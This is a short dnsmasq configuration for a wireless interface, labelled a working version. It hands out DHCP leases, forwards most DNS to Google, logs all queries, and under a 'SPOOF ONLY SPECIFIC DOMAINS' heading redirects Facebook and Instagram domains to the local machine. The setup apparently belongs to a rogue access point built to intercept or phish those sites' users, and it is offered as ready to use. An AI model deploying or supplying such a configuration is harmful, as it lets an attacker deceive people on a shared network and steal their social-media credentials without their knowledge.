# DNSMASQ FIXED CONFIG - WORKING VERSION
interface=wlan0
listen-address=192.168.1.1
dhcp-range=192.168.1.100,192.168.1.200,255.255.255.0,12h
dhcp-option=3,192.168.1.1
dhcp-option=6,192.168.1.1

# FORWARD TO GOOGLE DNS FOR NORMAL TRAFFIC
server=8.8.8.8
server=8.8.4.4

# NO BIND-INTERFACES (can cause issues)
# bind-interfaces

# ENABLE DNS CACHE
cache-size=1000

# SPOOF ONLY SPECIFIC DOMAINS
address=/facebook.com/192.168.1.1
address=/www.facebook.com/192.168.1.1
address=/m.facebook.com/192.168.1.1
address=/instagram.com/192.168.1.1
address=/www.instagram.com/192.168.1.1

# LOGGING (optional)
log-queries
log-facility=/tmp/dnsmasq.log